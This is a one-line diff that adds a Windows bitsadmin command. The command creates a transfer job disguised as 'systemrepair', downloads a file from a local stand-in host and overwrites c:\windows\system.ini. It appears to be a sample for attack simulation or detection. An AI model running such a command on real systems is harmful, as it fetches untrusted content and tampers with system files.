@@ -1,0 +1,1 @@
+bitsadmin /transfer systemrepair /download /priority normal http://127.0.0.1/file.txt c:\windows\system.ini
